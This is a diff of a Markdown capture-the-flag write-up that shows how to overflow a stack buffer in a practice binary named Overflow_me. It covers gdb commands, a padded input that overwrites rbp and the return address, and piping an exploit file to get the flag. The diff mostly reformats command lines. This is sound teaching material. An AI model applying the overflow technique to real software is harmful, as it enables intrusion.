@@ -29,18 +29,18 @@
 
 ## Load the Overflow Me on **GDB**    
   - Open the overflow_me on gdb
-    - gdb ./Overflow_me -q
+    > gdb ./Overflow_me -q
   - List the functions
-    - info function![Alt Text](img/functions.png)<br />There are three function. vuln,banner and main functions
+    > info function<br />![Alt Text](img/functions.png)<br />There are three function. vuln,banner and main functions
   - Disassembly the main function and set a breakpoint at leave statement
-    - disass main![Alt Text](img/leave.png)<br />
-    - b *0x41366441![Alt Text](img/break_lev.png)<br />
+    > disass main![Alt Text](img/leave.png)<br />
+    > b *0x41366441![Alt Text](img/break_lev.png)<br />
   - Run the binary
-    - run the binary with value of **AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7313BBBBBBBBCCCCCCCC** ( The padding is 108 byte ,comparsion value is 7313 and 8 byte of B and C ).
-      - run
+    - run the binary with value of **AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7313BBBBBBBBCCCCCCCC** ( The padding is 108 byte of A ,comparsion value is 7313 and 8 byte of B and C ).
+      > run
     - Hey, Now the breakpoint is hit.
     - List the value in rbp.
-      - x/20wx $rbp![Alt Text](img/rbp.png)<br />
+      > x/20wx $rbp![Alt Text](img/rbp.png)<br />
       - The value of 42 **(B)** is stored in rbp adn 43 **(C)** is stored in return address.
 
 ## Make a Exploit
@@ -57,5 +57,5 @@
 
 ## Run the Overflow with exp file
   - run the binary with exp file
-    - ./Overflow_Me < exp ![Alt Text](img/pip_exp.png)<br />
+    > ./Overflow_Me < exp ![Alt Text](img/pip_exp.png)<br />
     - Hey ,Finally we got the flag :smiley:![Alt Text](img/flag.png)<br />
